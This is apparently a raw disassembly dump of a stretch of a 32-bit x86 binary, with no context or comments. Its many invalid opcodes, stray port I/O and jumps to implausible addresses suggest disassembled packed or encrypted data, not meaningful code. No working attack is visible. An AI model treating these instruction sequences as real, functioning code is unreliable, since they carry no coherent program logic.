  41510e:	out    0xf8,eax
  415110:	in     eax,0xfd
  415112:	dec    DWORD PTR [edx-0x76c1ce57]
  415118:	mov    ecx,0xbceb4e31
  41511d:	mov    BYTE PTR [ebx-0x8],al
  415120:	popf   
  415121:	push   edx
  415122:	adc    cl,BYTE PTR [edi]
  415124:	xor    DWORD PTR [edi-0x1f],edi
  415127:	push   DWORD PTR [ebx-0x4c93a3c8]
  41512d:	or     BYTE PTR [ecx+0xdece3e4],0xb6
  415134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415135:	inc    eax
  415136:	aaa    
  415137:	inc    ebp
  415138:	push   0xd76d83fc
  41513d:	in     al,dx
  41513e:	std    
  41513f:	(bad)  
  415140:	jmp    0x8b74e54
  415145:	data16 (bad) 
  415147:	(bad)  
  415148:	sub    DWORD PTR [eax],ebx
  41514a:	mov    edi,edx
  41514c:	mov    ds:0xd8b1682,eax
  415151:	pop    esi
  415152:	lods   al,BYTE PTR ds:[esi]
  415153:	(bad)  
  415154:	clc    
  415155:	push   ss
  415156:	adc    esi,DWORD PTR [eax+eax*1+0x0]
	...
  415176:	sbb    DWORD PTR [edx-0x73],edi
  415179:	pop    es
  41517a:	jne    0x415142
  41517c:	sub    edi,esi
  41517e:	pop    edx
  41517f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415180:	inc    edx
  415181:	jae    0x415117
  415183:	and    BYTE PTR [eax+0x0],0xd
  415187:	daa    
  415188:	test   al,0xf1
  41518a:	xor    al,0x7d
  41518c:	add    DWORD PTR [eax],eax
  41518e:	or     eax,0x84fbbd9e
  415193:	pop    esp
  415194:	out    dx,al
  415195:	mov    dl,al
  415197:	add    al,ah
  415199:	mov    al,cl
  41519b:	cli    
  41519c:	mov    bl,0xe8
  41519e:	lods   eax,DWORD PTR ds:[esi]
  41519f:	daa    
  4151a0:	add    al,BYTE PTR [eax]
  4151a2:	xchg   BYTE PTR [edx+ebx*1+0x38],bl
  4151a6:	push   eax
  4151a7:	adc    eax,DWORD PTR [ebx]
  4151a9:	lea    esp,[eax]
  4151ab:	push   es
  4151ac:	adc    al,0xfe
  4151ae:	xchg   BYTE PTR [eax-0x5a],bl
  4151b1:	cmp    dl,ah
  4151b3:	xor    DWORD PTR [edi+0x22],edi
  4151b6:	icebp  
  4151b7:	stc    
  4151b8:	adc    eax,DWORD PTR [edx+0x75050b60]
  4151be:	dec    esi
  4151bf:	sahf   
  4151c0:	mov    esp,0x8ee68817
  4151c5:	push   ss
  4151c6:	aaa    
  4151c7:	daa    
  4151c8:	mov    dl,0x8c
  4151ca:	pop    ebx
  4151cb:	adc    edi,DWORD PTR [ebp-0x3e]
  4151ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151cf:	pop    eax
  4151d0:	lock push DWORD PTR [edx-0x6ff1bc65]
  4151d7:	push   esi
  4151d8:	and    eax,0xfe
	...
  4151f5:	add    BYTE PTR [eax],al
  4151f7:	add    BYTE PTR [edx+0x538ae82d],ah
  4151fd:	sub    ebx,ebp
  4151ff:	(bad)  
  415200:	(bad)  
  415201:	outs   dx,DWORD PTR ds:[esi]
  415202:	call   0xd0cd:0xf1ff971b
  415209:	jecxz  0x41521e
  41520b:	stc    
  41520c:	(bad)  
  41520d:	pop    ss
  41520e:	out    0x2,eax
  415210:	mov    DWORD PTR [edx],ebp
  415212:	mov    dl,BYTE PTR [ebx]
  415214:	imul   eax,DWORD PTR [ebp-0x45d8fad7],0xffffffcb
  41521b:	add    dl,BYTE PTR [ecx+0x53138a46]
  415221:	test   BYTE PTR [ebx],bl
  415223:	sbb    BYTE PTR [ebx],bl
  415225:	dec    edx
  415226:	jmp    0xa9569fb1
  41522b:	xchg   BYTE PTR ds:0xbf8ae600,dh
  415231:	adc    BYTE PTR [ebp+0x13],cl
  415234:	sub    ebx,ebx
  415236:	jae    0x41529f
  415238:	movsx  ebp,ax
  41523b:	xchg   BYTE PTR [edx],ah
  41523d:	add    eax,0xff3b87e6
  415242:	call   0x48c76c4a
  415247:	add    edx,DWORD PTR es:[eax]
  41524a:	imul   ecx,DWORD PTR [esi+eax*1],0xfa86f896
  415251:	std    
  415252:	xchg   esp,eax
  415253:	out    dx,al
  415254:	sub    DWORD PTR [ebp-0xf2fc18],eax
  41525a:	arpl   WORD PTR [edi+0x0],di
	...
  415279:	add    ah,ch
  41527b:	pmaddwd mm2,mm6
  41527e:	xchg   edx,eax
  41527f:	leave  
  415280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415281:	mov    ds:0x256a851b,eax
  415286:	ret    
  415287:	bswap  edi
  415289:	pop    edi
  41528a:	mov    edx,0x50cee80f
  41528f:	pushf  
  415290:	fld    QWORD PTR [esi+0x3e9006f]
  415296:	(bad)  
  415297:	retf   
  415298:	repnz add dl,BYTE PTR [eax+0xee8ff6a]
  41529f:	add    BYTE PTR [ebx-0x40],al
  4152a2:	add    cl,BYTE PTR [edi]
  4152a4:	(bad)  
  4152a5:	jmp    0xee496a35
  4152aa:	xchg   edx,eax
  4152ab:	test   eax,0x821f96e1
  4152b0:	test   ecx,0x8b50840f
  4152b6:	dec    DWORD PTR ds:0xe493c
  4152bc:	add    BYTE PTR [edx-0x1f087d8b],al
  4152c2:	mov    ds:0x2e618295,al
  4152c7:	xchg   ebx,eax
  4152c8:	jo     0x4152e6
  4152ca:	mov    cl,0xe
  4152cc:	(bad)  
  4152cd:	jmp    0x4b75d7e1
  4152d2:	dec    DWORD PTR ds:0x178bcdea
  4152d8:	or     DWORD PTR [ebx-0x1b087da1],edi
	...
  4152fa:	add    BYTE PTR [eax],al
  4152fc:	jbe    0xe609e26
  415302:	cmp    al,0x6c
  415304:	push   cs
  415305:	add    BYTE PTR [eax],al
  415307:	adc    bh,BYTE PTR [ecx+0xfe3f781]
  41530d:	adc    BYTE PTR [ebx+ecx*1],0xff
  415311:	or     eax,0x960d0182
  415316:	inc    eax
  415317:	mov    esp,0xe9fe0e85
  41531c:	repz cmp al,0x8a
  41531f:	lahf   
  415320:	loop   0x415336
  415322:	add    esi,ecx
  415324:	or     bl,BYTE PTR [ebx]
  415326:	les    esi,FWORD PTR [edx-0x31]
  415329:	shl    ch,cl
  41532b:	in     eax,dx
  41532c:	mov    dh,0x2
  41532e:	jmp    0x41533b
  415330:	sub    BYTE PTR [ebp-0x89dffcd],bh
  415336:	pop    es
  415337:	add    DWORD PTR [edi-0x6fb1764c],edi
  41533d:	call   0xebb65b44
  415342:	push   cs
  415343:	mov    edi,DWORD PTR [edx]
  415345:	sub    ah,dh
  415347:	add    al,0x7c
  415349:	adc    ch,cl
  41534b:	mov    eax,ds:0xf63241ef
  415350:	jo     0x41535c
  415352:	push   cs
  415353:	(bad)  
  415355:	rcr    bh,0xff
  415358:	fcomi  st,st(0)
  41535a:	inc    ebx
  41535b:	adc    al,0xdb
  41535d:	jbe    0x415381
  41535f:	push   0x0
	...
  41537d:	add    BYTE PTR [edi+ebp*8],dh
  415380:	jae    0x41539e
  415382:	mov    edi,0xc75fdc8
  415387:	(bad)  
  415388:	leave  
  415389:	push   esi
  41538a:	(bad)  [esi+0xe]
  41538d:	inc    DWORD PTR [ecx+0xe]
  415390:	std    
  415391:	jne    0x4153af
  415393:	jmp    0xc083:0xf0dbd603
  41539a:	sub    eax,DWORD PTR [esi-0x10c40185]
  4153a0:	jmp    0x573df1a8
  4153a5:	pop    edi
  4153a6:	mov    edx,0xc4c2c75c
  4153ab:	add    DWORD PTR [eax-0x1bbc7ca],edx
  4153b1:	adc    edx,DWORD PTR [esi]
  4153b3:	inc    esp
  4153b4:	(bad)  
  4153b5:	sbb    BYTE PTR [esi],al
  4153b7:	inc    esp
  4153b8:	(bad)  
  4153b9:	and    eax,0x57fe4406
  4153be:	pop    ss
  4153bf:	inc    esp
  4153c0:	(bad)  
  4153c1:	push   esi
  4153c2:	rol    BYTE PTR [ecx-0x2],1
  4153c5:	imul   edx,eax,0x41
  4153c8:	inc    BYTE PTR [esi-0x3dc4f3]
  4153ce:	xchg   BYTE PTR [ebx-0x3e],al
  4153d1:	push   DWORD PTR [eax+0x3b]
  4153d4:	ret    0xd3ff
  4153d7:	inc    ebx
  4153d8:	ret    0xbbff
  4153db:	cmp    al,dl
  4153dd:	jmp    FWORD PTR ds:0xffc243
	...
  4153ff:	add    BYTE PTR [ecx+0x7b],ah
  415402:	ret    0xc5ff
  415405:	add    edx,0xffffffff
  415408:	dec    esp
  415409:	jl     0x4153cd
  41540b:	jmp    DWORD PTR [edi]
  41540d:	test   edx,eax
  41540f:	jmp    edx
  415411:	jl     0x4153d5
  415413:	jmp    DWORD PTR [ecx+0x79]
  415416:	ret    0x6bff
  415419:	jns    0x4153dd
  41541b:	dec    DWORD PTR [ebp-0x66003d85]
  415421:	mov    eax,0xb8e7ffc2
  415426:	ret    0x3dff
  415429:	mov    edi,0xbffcffc2
  41542e:	ret    0xa1ff
  415431:	mov    cl,0xc2
  415433:	inc    DWORD PTR [ecx-0x42003d50]
  415439:	mov    edi,0xc041ffc2
  41543e:	ret    0x73ff
  415441:	lock ret 0x79ff
  415445:	lock ret 0x8aff
  415449:	inc    edx
  41544b:	call   DWORD PTR [eax+eax*1-0x3d]
  41544f:	push   DWORD PTR [esi]
  415451:	repz ret 0xc8ff
  415455:	icebp  
  415456:	ret    0x98ff
  415459:	add    ebx,eax
  41545b:	push   DWORD PTR [esi-0x3b003cff]
  415461:	call   ecx
  415463:	les    eax,FWORD PTR [eax]
	...
  415481:	add    BYTE PTR [edx-0x4d3b32fd],bh
  415487:	out    dx,al
  415488:	(bad)  
  415489:	les    ebp,FWORD PTR [edx-0x5d3b419a]
  41548f:	rcl    esi,cl
  415491:	les    ebx,FWORD PTR [edx-0x6d3b3110]
  415497:	stos   DWORD PTR es:[edi],eax
  415498:	mov    ah,0x8a
  41549b:	cwde   
  41549c:	mov    esi,0x969082c4
  4154a1:	les    edi,FWORD PTR [edx+0x7e]
  4154a4:	mov    es,esp
  4154a6:	jb     0x4154ac
  4154a8:	add    esp,0xc486436a
  4154ae:	bound  ecx,QWORD PTR [ebp+0x335ac482]
  4154b4:	fwait
  4154b5:	les    edx,FWORD PTR [edx-0x63]
  4154b8:	xchg   ebp,eax
  4154b9:	les    ecx,FWORD PTR [edx-0x29]
  4154bc:	mov    ah,al
  4154be:	inc    edx
  4154bf:	jl     0x415505
  4154c1:	les    edi,FWORD PTR [edx]
  4154c3:	in     eax,dx
  4154c4:	cmp    eax,esp
  4154c6:	xor    dl,BYTE PTR [ecx+0x33]
  4154c9:	les    ebp,FWORD PTR [edx]
  4154cb:	sub    BYTE PTR [esi],0xc4
  4154ce:	and    ah,BYTE PTR [edi]
  4154d0:	cmp    eax,esp
  4154d2:	sbb    cl,BYTE PTR [edx+0x33]
  4154d5:	les    edx,FWORD PTR [edx]
  4154d7:	daa    
  4154d8:	sbb    eax,0xd840ac4
  4154dd:	les    eax,FWORD PTR [edx]
  4154df:	cmp    al,BYTE PTR [ebp-0x3c]
  4154e2:	cli    
  4154e3:	xor    DWORD PTR [esi],edx
  4154e5:	les    eax,FWORD PTR [eax]
	...
  415503:	add    dl,dh
  415505:	jg     0x415524
  415507:	(bad)  
  415508:	jmp    0xfc:0xe2c41540
  41550f:	(bad)  
  415510:	fidivr DWORD PTR [eax+eax*1-0x8a2d3c]
  415517:	lock into 
  415519:	or     edx,ecx
  41551b:	icebp  
  41551c:	into   
  41551d:	or     eax,DWORD PTR [ebp-0x22]
  415520:	into   
  415521:	or     ebx,DWORD PTR [edx]
  415523:	retf   0xbce
  415526:	shl    BYTE PTR [edx-0x36f2f432],1
  41552c:	into   
  41552d:	or     esi,DWORD PTR [esi-0x18]
  415530:	ror    DWORD PTR [ebx],1
  415532:	(bad)  
  415533:	call   0xed455444
  415538:	adc    eax,0x81e10702
  41553d:	stc    
  41553e:	or     dh,ch
  415540:	jp     0x4154fa
  415542:	dec    eax
  415543:	in     al,dx
  415544:	jo     0x415540
  415546:	psubb  mm5,QWORD PTR [ecx+0x65f512f1]
  41554d:	cmc    
  41554e:	push   ss
  41554f:	loope  0x4155ba
  415551:	jmp    0xe9a6386f
  415556:	sbb    edx,edx
  415558:	aaa    
  415559:	out    0x1c,eax
  41555b:	iret   
  41555c:	xor    ebp,ebx
  41555e:	and    BYTE PTR [eax],cl
  415560:	xor    al,ah
  415562:	and    BYTE PTR [eax],cl
  415564:	das    
  415565:	loope  0x415589
  415567:	or     eax,0x0
	...
  415584:	add    BYTE PTR [eax],al
  415586:	xor    al,0xe5
  415588:	add    DWORD PTR es:[ecx-0x1d],eax
  41558c:	daa    
  41558d:	adc    DWORD PTR [ecx],edi
  41558f:	fsubr  DWORD PTR [eax]
  415591:	adc    esi,DWORD PTR [esi]
  415593:	xlat   BYTE PTR ds:[ebx]
  415594:	sub    al,0x7
  415596:	enter  0x48b7,0xa0
  41559a:	shl    DWORD PTR [edi-0x26244fb8],0x48
  4155a1:	(bad)  
  4155a3:	shl    BYTE PTR [edx],1
  4155a5:	ffree  st(2)
  4155a7:	into   
  4155a8:	xor    al,0xd7
  4155aa:	(bad)
  4155ad:	add    ah,cl
  4155af:	cmp    edi,DWORD PTR [eax]
  4155b1:	cmp    ecx,ebp
  4155b3:	cmp    BYTE PTR [ecx],bh
  4155b5:	dec    ecx
  4155b6:	ins    DWORD PTR es:[edi],dx
  4155b7:	dec    ebx
  4155b8:	inc    edi
  4155b9:	dec    ecx
  4155ba:	jo     0x4155eb
  4155bc:	cmp    al,0x3f
  4155be:	in     al,0x3e
  4155c0:	inc    eax
  4155c1:	inc    ebx
  4155c2:	call   0xfb419a09
  4155c7:	dec    ebx
  4155c8:	mov    fs,esp
  4155ca:	les    eax,FWORD PTR [ebx-0x2]
  4155cd:	pop    ds
  4155ce:	push   ebp
  4155cf:	inc    ebx
  4155d0:	(bad)  
  4155d1:	pop    ebx
  4155d2:	push   ebp
  4155d3:	inc    ebx
  4155d4:	(bad)  
  4155d5:	xchg   edi,eax
  4155d6:	lds    eax,FWORD PTR [ebx-0x2]
  4155d9:	rol    ch,1
  4155db:	inc    ebx
  4155dc:	inc    BYTE PTR ds:0xe7fe4396
  4155e2:	add    BYTE PTR [ebx-0x2],0x5d
  4155e6:	xchg   ebx,eax
  4155e7:	inc    ebx
  4155e8:	(bad)  
  4155e9:	pop    ebp
	...
  415606:	add    BYTE PTR [eax],al
  415608:	jecxz  0x41564d
  41560a:	(bad)  
  41560b:	fcom   DWORD PTR [ebx-0x2c2701bd]
  415611:	inc    ebx
  415612:	(bad)  
  415613:	jno    0x4155a8
  415615:	inc    ebx
  415616:	(bad)  
  415617:	rol    ebx,cl
  415619:	inc    ebx
  41561a:	(bad)  
  41561b:	sbb    edx,esp
  41561d:	inc    ebx
  41561e:	(bad)  
  41561f:	pop    ebx
  415620:	aam    0x43
  415622:	(bad)  
  415623:	lahf   
  415624:	les    eax,FWORD PTR [ebx-0x2]
  415627:	gs mov eax,0xd897fe43
  41562d:	inc    ebx
  41562e:	dec    cl
  415630:	fadd   DWORD PTR [ebx-0x2]
  415633:	sti    
  415634:	dec    eax
  415635:	inc    esp
  415636:	(bad)  
  415637:	sub    eax,0x5ffe4439
  41563c:	sbb    DWORD PTR [esi+edi*8+0x66],eax
  415640:	push   ss
  415641:	inc    esp
  415642:	(bad)  
  415643:	mov    esp,0xffc3e50d
  415648:	mov    eax,ds:0xb5ffc3e5
  41564d:	add    al,ah
  41564f:	push   DWORD PTR [ebp+0x1ffc20a]
  415655:	push   es
  415656:	ret    0x7cff
  415659:	push   es
  41565a:	ret    0xdbff
  41565d:	es ret 0xe8ff
  415661:	xor    al,dl
  415663:	dec    DWORD PTR [ecx+0x2b]
  415666:	ret    0xffff
  415669:	pop    ss
  41566a:	sar    edi,0x0
	...
  415689:	add    dh,dh
  41568b:	pop    ss
  41568c:	sar    edi,0xe9
  41568f:	pop    ss
  415690:	sar    edi,0x38
  415693:	sbb    cl,al
  415695:	(bad)  
  415696:	cmp    ebx,DWORD PTR [eax]
  415698:	sar    edi,0x3a
  41569b:	sbb    cl,al
  41569d:	inc    ecx
  41569f:	pop    ss
  4156a0:	sar    edi,0xd9
  4156a3:	pop    ss
  4156a4:	sar    edi,0xd1
  4156a7:	pop    ss
  4156a8:	sar    edi,0x35
  4156ab:	add    dl,0xff
  4156ae:	xor    eax,0xb9ffc28a
  4156b3:	push   ss
  4156b4:	sar    edi,0x85
  4156b7:	pop    ss
  4156b8:	sar    edi,0x5c
  4156bb:	pop    ss
  4156bc:	sar    edi,0x25
  4156bf:	pop    ss
  4156c0:	sar    edi,0x28
  4156c3:	pop    ss
  4156c4:	sar    edi,0xb9
  4156c7:	popf   
  4156c8:	push   ds
  4156c9:	sub    BYTE PTR [ecx],0xb
  4156cc:	add    DWORD PTR [eax],eax
  4156ce:	or     eax,0xaf3bd96
  4156d3:	xchg   esi,eax
  4156d4:	mov    ebp,0xbd9602ef
  4156d9:	retf   
  4156da:	cli    
  4156db:	(bad)  
  4156dc:	mov    ecx,0xb6f85178
  4156e1:	sar    BYTE PTR [eax+esi*4-0x436ef49f],1
  4156e8:	or     eax,0x6f20417a
  4156ed:	mov    dh,0x0
	...
  41570b:	add    dl,cl
  41570d:	jbe    0x4156a2
  41570f:	das    
  415710:	xchg   ebp,eax
  415711:	stos   BYTE PTR es:[edi],al
  415712:	hlt    
  415713:	jns    0x41576e
  415715:	sbb    BYTE PTR [edi-0x3a],bl
  415718:	retf   0xdd74
  41571b:	iret   
  41571c:	mov    ah,0xf8
  41571e:	fs loopne 0x415734
  415721:	add    cl,ch
  415723:	into   
  415724:	(bad)  
  415725:	clc    
  415726:	fs call 0xcd2a573f
  41572c:	cmp    eax,esi
  41572e:	xor    edi,ebp
  415730:	inc    ebp
  415731:	mov    bl,0xdc
  415733:	cli    
  415734:	xchg   ebx,eax
  415735:	stc    
  415736:	in     eax,0x3
  415738:	or     eax,0xf1f03bc7
  41573d:	add    BYTE PTR [ebx],dl
  41573f:	adc    eax,0x3ee0375
  415744:	or     eax,0x2c355f9
  415749:	std    
  41574a:	lods   eax,DWORD PTR ds:[esi]
  41574b:	jge    0x4156d6
  41574d:	scas   eax,DWORD PTR es:[edi]
  41574e:	jge    0x41575b
  415750:	dec    ebx
  415751:	clc    
  415752:	cmp    eax,0x637726c3
  415757:	mov    esp,0xfb65083b
  41575c:	jnp    0x41571e
  41575e:	add    bh,BYTE PTR [ebp-0x6f]
  415761:	mov    ebx,0x47230b55
  415766:	test   al,0xc5
  415768:	or     eax,DWORD PTR [eax]
  41576a:	jo     0x4156ed
  41576c:	out    0x8,al
  41576e:	cmp    eax,0xb
	...
  41578b:	add    BYTE PTR [eax],al
  41578d:	add    BYTE PTR [ebp+0x17f8ff7d],dl
  415793:	push   es
  415794:	(bad)  
  415795:	(bad)  
  415796:	into   
  415797:	out    0x88,eax
  415799:	mov    esp,0x2144784e
  41579e:	fiadd  DWORD PTR [ecx+0x74]
  4157a1:	out    dx,al
  4157a2:	dec    edi
  4157a3:	mov    esp,0xc77731f7
  4157a8:	jmp    DWORD PTR [edi-0x3a]
  4157ab:	mov    esp,0x937eaa51
  4157b0:	and    eax,0xfd3b8c64
  4157b5:	out    dx,al
  4157b6:	pop    es
  4157b7:	mov    bh,0x69
  4157b9:	jmp    0xe038d3f3
  4157be:	pop    ss
  4157bf:	push   es
  4157c0:	dec    edi
  4157c1:	bound  ecx,QWORD PTR [edi+0x1f]
  4157c4:	or     DWORD PTR [edi+eax*1+0x6],ebp
  4157c8:	mov    bh,BYTE PTR [ecx-0x198bf273]
  4157ce:	test   al,0xb
  4157d0:	call   0x41642f
  4157d5:	cli    
  4157d6:	inc    eax
  4157d7:	jp     0x41581e
  4157d9:	icebp  
  4157da:	repz rcl BYTE PTR ds:[ecx-0x1217bfa0],0x8b
  4157e3:	daa    
  4157e4:	add    BYTE PTR [edx+0x31],ch
  4157e7:	add    BYTE PTR [ecx-0x4909e2d4],cl
  4157ed:	daa    
  4157ee:	cmp    edi,DWORD PTR [eax+0x4c]
  4157f1:	xchg   ecx,eax
	...
  41580e:	add    BYTE PTR [eax],al
  415810:	inc    edi
  415811:	dec    esi
  415812:	dec    ebp
  415813:	fst    st(1)
  415815:	pop    ss
  415816:	add    ch,BYTE PTR [edx-0x17]
  415819:	dec    DWORD PTR [eax-0x1f9b594]
  41581f:	push   esi
  415820:	daa    
  415821:	dec    esi
  415822:	dec    ebp
  415823:	in     eax,dx
  415824:	pop    ss
  415825:	push   esi
  415826:	mov    DWORD PTR [eax],0x1844b21b
  41582c:	jge    0x415886
  41582e:	mov    es,WORD PTR [ebx]
  415830:	cdq    
  415831:	push   cs
  415832:	add    edi,ecx
  415834:	out    0xbb,eax
  415836:	xchg   DWORD PTR [ebp+0x78],eax
  415839:	test   BYTE PTR [ebx-0x50],dl
  41583c:	pop    ebp
  41583d:	pop    eax
  41583e:	xchg   edx,eax
  41583f:	mov    esi,DWORD PTR [edx-0xe1740f6]
  415845:	sub    eax,0xbbc741c7
  41584a:	xchg   DWORD PTR [ebp-0x20674],eax
  415850:	das    
  415851:	inc    ecx
  415852:	push   es
  415853:	ror    DWORD PTR [esi+eax*1],0x21
  415857:	sar    DWORD PTR ds:0x3189e247,0x68
  41585e:	std    
  41585f:	(bad)  
  415860:	mov    ebx,0x65084484
  415865:	jecxz  0x415882
  415867:	and    esp,DWORD PTR [ebp-0x76]
  41586a:	xor    DWORD PTR [ebx+ecx*8-0x8],0xfffffffd
  41586f:	mov    esi,DWORD PTR [edx]
  415871:	add    al,0xbf
  415873:	call   0x415878
	...
  415890:	add    BYTE PTR [eax],al
  415892:	pop    ebp
  415893:	sbb    edi,DWORD PTR [edi-0x2941e77]
  415899:	dec    DWORD PTR [ebx-0x1207bc7c]
  41589f:	xchg   BYTE PTR [esi-0x1],dl
  4158a2:	mov    edi,eax
  4158a4:	add    eax,DWORD PTR [eax+0x67]
  4158a7:	add    al,BYTE PTR [eax]
  4158a9:	mov    ecx,esp
  4158ab:	pop    edi
  4158ac:	std    
  4158ad:	(bad)  
  4158ae:	mov    ebx,0xab68938a
  4158b3:	clc    
  4158b4:	std    
  4158b5:	mov    DWORD PTR [ecx-0x34000289],esi
  4158bb:	mov    dl,BYTE PTR [ebx-0x80]
  4158be:	or     eax,0x84a3aea0
  4158c3:	dec    ebx
  4158c4:	jle    0x41584e
  4158c6:	mov    eax,0xc9547ad4
  4158cb:	nop
  4158cc:	jle    0x415929
  4158ce:	add    cl,bh
  4158d0:	or     BYTE PTR [edx+0x5c791f53],cl
  4158d6:	add    DWORD PTR [eax+0x188d0003],esi
  4158dc:	mov    cs,WORD PTR [ecx]
  4158de:	int3   
  4158df:	push   eax
  4158e1:	and    cl,ah
  4158e3:	mov    al,ds:0x1ae687be
  4158e8:	jns    0x41593e
  4158ea:	xchg   ebp,eax
  4158eb:	xchg   edx,eax
  4158ec:	rol    DWORD PTR [edi],0xe8
  4158ef:	push   ss
  4158f0:	add    dh,BYTE PTR [eax+0xd]
  4158f3:	add    DWORD PTR [edi+ebx*2],0x0
	...
  415912:	add    BYTE PTR [eax],al
  415914:	cmp    DWORD PTR [ebp+0x7aaffc6],esi
  41591a:	add    dh,BYTE PTR [esi+edi*1-0x14]
  41591e:	add    eax,DWORD PTR [eax]
  415920:	in     eax,dx
  415921:	push   ss
  415922:	mov    es,WORD PTR [esi-0x30]
  415925:	push   ss
  415926:	add    dh,BYTE PTR [eax]
  415928:	or     eax,0xd3ceecb
  41592d:	pop    ss
  41592e:	ret    0xfeff
  415931:	loopne 0x4158f9
  415933:	push   DWORD PTR [edx-0x39]
  415936:	add    esi,DWORD PTR [esi+eiz*1-0xf]
  41593a:	sbb    ch,al
  41593c:	mov    DWORD PTR [edx+eax*1],edx
  41593f:	add    BYTE PTR [ebp+0x52fff521],dl
  415945:	nop
  415946:	ins    DWORD PTR es:[edi],dx
  415947:	aas    
  415948:	dec    edx
  415949:	xchg   BYTE PTR [edi],al
  41594b:	cmp    al,0x42
  41594d:	pop    ss
  41594e:	add    al,BYTE PTR [eax]
  415950:	mov    ebx,0x4cc77b48
  415955:	add    BYTE PTR [eax-0x5],ah
  415958:	xchg   ebp,eax
  415959:	inc    ebx
  41595a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41595b:	or     BYTE PTR [ebx],ah
  41595d:	add    eax,0x4be7660
  415962:	dec    ebp
  415963:	or     BYTE PTR [edx+0xb089b7b],cl
  415969:	add    eax,0xfa74de51
  41596e:	nop
  41596f:	sbb    al,0xe1
  415971:	cdq    
  415972:	fistp  DWORD PTR [esi*8+0xc36376]
	...
  415995:	add    bl,ch
  415997:	add    al,0x1d
  415999:	sbb    al,0xfe
  41599b:	jbe    0x415a00
  41599d:	ret    
  41599e:	fild   DWORD PTR [ecx*1+0x7377061c]
  4159a5:	mov    edi,0x7afd04cb
  4159aa:	mov    DWORD PTR [ebx+0x78bb07f5],ebp
  4159b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159b1:	sti    
  4159b2:	xchg   DWORD PTR [edx-0x3357d04],eax
  4159b8:	outs   dx,DWORD PTR ds:[esi]
  4159b9:	add    DWORD PTR [edx],0x8707d505
  4159bf:	cmp    al,0x6f
  4159c1:	call   0x4d1b:0xdbda70f
  4159c8:	es repnz aaa 
  4159cb:	or     cl,BYTE PTR [esi-0x7f]
  4159ce:	mov    edx,0x4a7af18b
  4159d3:	js     0x415982
  4159d5:	call   0xc867:0xf41670f
  4159dc:	mov    al,ds:0xf732988
  4159e1:	add    eax,0x7ae904e6
  4159e6:	pop    ebx
  4159e7:	xchg   DWORD PTR ds:[edx],eax
  4159ea:	inc    edx
  4159eb:	jmp    0x61ff:0xc1fa18ff
  4159f2:	loope  0x415a6b
  4159f4:	pushf  
  4159f5:	sbb    eax,0x64fe0612
	...
  415a16:	add    BYTE PTR [eax],al
  415a18:	test   BYTE PTR [ebx+0x1804c306],0xdf
  415a1f:	in     eax,0xe
  415a21:	add    bh,al
  415a23:	lods   al,BYTE PTR ds:[esi]
  415a24:	add    BYTE PTR cs:[eax],al
  415a27:	jmp    0x624b713a
  415a2c:	int3   
  415a2d:	xrelease mov BYTE PTR [ebp+ebx*8+0x2],ah
  415a32:	(bad)  
  415a33:	sub    cx,WORD PTR es:[ebp+eiz*8-0x15969735]
  415a3c:	test   eax,0x6c6af80a
  415a41:	mov    ds:0x31206fe,eax
  415a46:	sub    DWORD PTR [edx+ebx*2-0x36cb77fe],0x31eefe02
  415a51:	jl     0x415a8e
  415a53:	out    0x13,al
  415a55:	add    cl,BYTE PTR [esi]
  415a57:	xchg   esi,eax
  415a58:	pusha  
  415a59:	repz mov WORD PTR ds:0x2488fe11,gs
  415a60:	cmc    
  415a61:	lds    eax,FWORD PTR [ebp+ebx*8-0x70]
  415a65:	dec    BYTE PTR [eax-0x2583dac4]
  415a6b:	cmp    eax,0xbd447657
  415a70:	loope  0x415a47
  415a72:	rcr    edx,0x1c
  415a75:	xor    bh,dh
  415a77:	sub    esp,esp
  415a79:	idiv   BYTE PTR [edx+0xc2]
	...
  415a97:	add    BYTE PTR [eax],al
  415a99:	add    BYTE PTR [esi],bl
  415a9b:	je     0x415aa0
  415a9d:	js     0x415a2e
  415a9f:	sbb    BYTE PTR [ebx],al
  415aa1:	add    BYTE PTR [edi-0x39],cl
  415aa4:	jo     0x415ab6
  415aa6:	mov    bh,0x3
  415aa8:	std    
  415aa9:	or     DWORD PTR [ebp+0x37c83903],0xfffffff5
  415ab0:	mov    DWORD PTR [ebp-0x204f8],ebx
  415ab6:	mov    bh,0x77
  415ab8:	(bad)  
  415ab9:	add    BYTE PTR [ecx],bh
  415abb:	sub    ah,dh
  415abd:	inc    esi
  415abe:	xor    BYTE PTR [ecx],al
  415ac0:	je     0x415ae9
  415ac2:	add    esi,DWORD PTR [edx-0x3880ebbc]
  415ac8:	jg     0x415aab
  415aca:	inc    ebx
  415acb:	(bad)  
  415acc:	(bad)  
  415acd:	jmp    DWORD PTR ds:0x148306e7
  415ad3:	cld    
  415ad4:	mov    BYTE PTR [ebp-0x8],cl
  415ad7:	add    DWORD PTR [ebx-0x38],0x78
  415adb:	pop    es
  415adc:	mov    DWORD PTR [ebp-0x20664],eax
  415ae2:	ret    
  415ae3:	mov    ah,0x2
  415ae5:	or     BYTE PTR ds:0x6af6f240,bh
  415aeb:	or     al,BYTE PTR [edx]
  415aed:	je     0x415ab9
  415aef:	or     DWORD PTR [ebp-0x397855ba],esi
  415af5:	sar    DWORD PTR [ebx+eax*1-0x43c1e81],0xff
  415afd:	inc    DWORD PTR [eax]
	...
  415b1b:	add    BYTE PTR [edi],ah
  415b1d:	fdiv   st(7),st
  415b1f:	mov    BYTE PTR [ecx],bh
  415b21:	fmul   DWORD PTR [ecx-0x4bf3b3bb]
  415b27:	test   BYTE PTR [esi+edi*8+0x0],ch
  415b2b:	add    BYTE PTR [ebp+eax*4+0x4b],ah
  415b2f:	lock fld QWORD PTR [edx-0x36]
  415b33:	mov    ebp,DWORD PTR [ecx]
  415b35:	or     BYTE PTR [ecx+0x7a6d0d55],cl
  415b3b:	inc    esp
  415b3c:	push   ebp
  415b3d:	fwait
  415b3e:	sub    BYTE PTR [ebx+0x25],dh
  415b41:	mov    ?,WORD PTR [esi+0x7f1490eb]
  415b47:	cmp    dl,BYTE PTR [ebp+eax*1-0xc]
  415b4b:	sub    al,BYTE PTR [esi-0x21]
  415b4e:	inc    edx
  415b4f:	call   0xc7c0b363
  415b54:	and    cl,BYTE PTR [ebp-0x6a990df8]
  415b5a:	xchg   bl,dl
  415b5c:	or     eax,0x78a9c2d
  415b61:	jmp    FWORD PTR [esi+0x7f637e93]
